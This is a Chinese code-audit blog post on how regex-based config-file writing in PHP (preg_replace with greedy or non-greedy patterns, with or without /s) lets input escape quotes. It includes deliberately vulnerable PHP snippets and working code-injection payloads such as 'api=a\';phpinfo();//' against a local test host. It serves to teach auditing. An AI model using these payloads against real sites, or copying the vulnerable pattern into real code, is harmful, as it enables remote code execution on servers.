---
title: "正则写配置文件常见的漏洞"
date: 2020-04-28T10:45:36+08:00
draft: false
tags:
- 正则
- php
series:
-
categories:
- 代码审计
---

关于正则表达式的利用。
<!--more-->

之前ATEAM发了《这是一篇“不一样”的真实渗透测试案例分析》文章，其中dz的getshell的部份利用的就是对于配置文件正则处理不当，然后P牛的博客也写了一篇 [经典写配置漏洞与几种变形](https://www.leavesongs.com/PENETRATION/thinking-about-config-file-arbitrary-write.html)

本文总结下在正则下写文件常见的错误。

## 无单行/s+贪婪模式
```php
<?php
$api = addslashes($_GET['api']);
$file = file_get_contents('./config.php');
$file = preg_replace("/\\\$API = '.*';/", "\$API = '{$api}';", $file);
file_put_contents('./config.php', $file);
```
config.php

```php
<?php
$API = 'http://baidu.com';
```
功能很简单，就是正则匹配API然后写入，主要的问题就出在正则身上，**贪婪模式并且无/s单行**，可以通过换行符绕过。看图:

第一次访问
![image.png](https://y4er.com/img/uploads/20200428107774.png)

这个时候再请求
![image.png](https://y4er.com/img/uploads/20200428109683.png)

因为正则贪婪匹配的问题第二次请求会将`'a\'`吃掉`\`进而逃逸单引号。

## 单行/s+贪婪模式
```php
<?php
$api = addslashes($_GET['api']);
$file = file_get_contents('./config.php');
$file = preg_replace("/\\\$API = '.*';/s", "\$API = '{$api}';", $file);
file_put_contents('./config.php', $file);
```
正则多了`/s`，那么上面的payload在第二次访问时会将`%0a`换行也匹配上，单引号无法逃逸。

给出payload：`http://php.local/test/index.php?api=a\';phpinfo();//`

![image.png](https://y4er.com/img/uploads/20200428102787.png)


思考一个问题：为什么`\`符号没有被转义？不是用了`addslashes()`吗？

在php的[官方手册](https://www.php.net/manual/zh/function.preg-replace.php#refsect1-function.preg-replace-parameters)中提到了关于preg_replace()第二个参数转义的问题。

> 引用：replacement中可以包含后向引用\\n 或`$n`，语法上首选后者。 每个 这样的引用将被匹配到的第n个捕获子组捕获到的文本替换。 n 可以是0-99，\\0和`$0`代表完整的模式匹配文本。 捕获子组的序号计数方式为：代表捕获子组的左括号从左到右， 从1开始数。如果要在replacement 中使用反斜线，必须使用4个("`\\\\`"，译注：因为这首先是php的字符串，经过转义后，是两个，再经过 正则表达式引擎后才被认为是一个原文反斜线)。

四个反斜线才被解析为一个反斜线，所以我们的payload可以逃逸单引号。

还有一种是正则的解法，先请求
![image.png](https://y4er.com/img/uploads/20200428104394.png)

再请求
![image.png](https://y4er.com/img/uploads/20200428100791.png)
可能插坏配置文件- -

## 无单行/s+非贪婪
```php
<?php
$api = addslashes($_GET['api']);
$file = file_get_contents('./config.php');
$file = preg_replace("/\\\$API = '.*?';/", "\$API = '{$api}';", $file);
file_put_contents('./config.php', $file);
```
解法和无单行+贪婪是一样的，因为都可以通过换行逃逸。

## 单行/s+非贪婪
```php
<?php
$api = addslashes($_GET['api']);
$file = file_get_contents('./config.php');
$file = preg_replace("/\\\$API = '.*?';/s", "\$API = '{$api}';", $file);
file_put_contents('./config.php', $file);
```

解法：`http://php.local/test/index.php?api=a\';phpinfo();//`

![image.png](https://y4er.com/img/uploads/20200428100227.png)

因为四个`\`才算一个反斜线，我们只传了一个，写入的一个反斜线会将单引号的反斜线转义掉，进而逃逸单引号。

P牛的解法更简单

- http://localhost:9090/update.php?api=aaaa%27;phpinfo();//
- http://localhost:9090/update.php?api=aaaa

第一次传入放了一个单引号进去
![image.png](https://y4er.com/img/uploads/20200428103461.png)

第二次传入因为是非贪婪，所以只替换掉了第一个单引号之前的，替换之后将我们的`\`吃掉了，进而phpinfo()逃逸出来。
![image.png](https://y4er.com/img/uploads/20200428106984.png)

## 总结
还有一些define定义常量的例子，这里不一一列举了，明白了原理举一反三注意闭合就行了。涉及到正则表达式的特性和php函数的特性，又学到了一招。

## 参考
1. https://www.leavesongs.com/PENETRATION/thinking-about-config-file-arbitrary-write.html
2. https://www.php.net/manual/zh/function.preg-replace.php


**文笔垃圾，措辞轻浮，内容浅显，操作生疏。不足之处欢迎大师傅们指点和纠正，感激不尽。**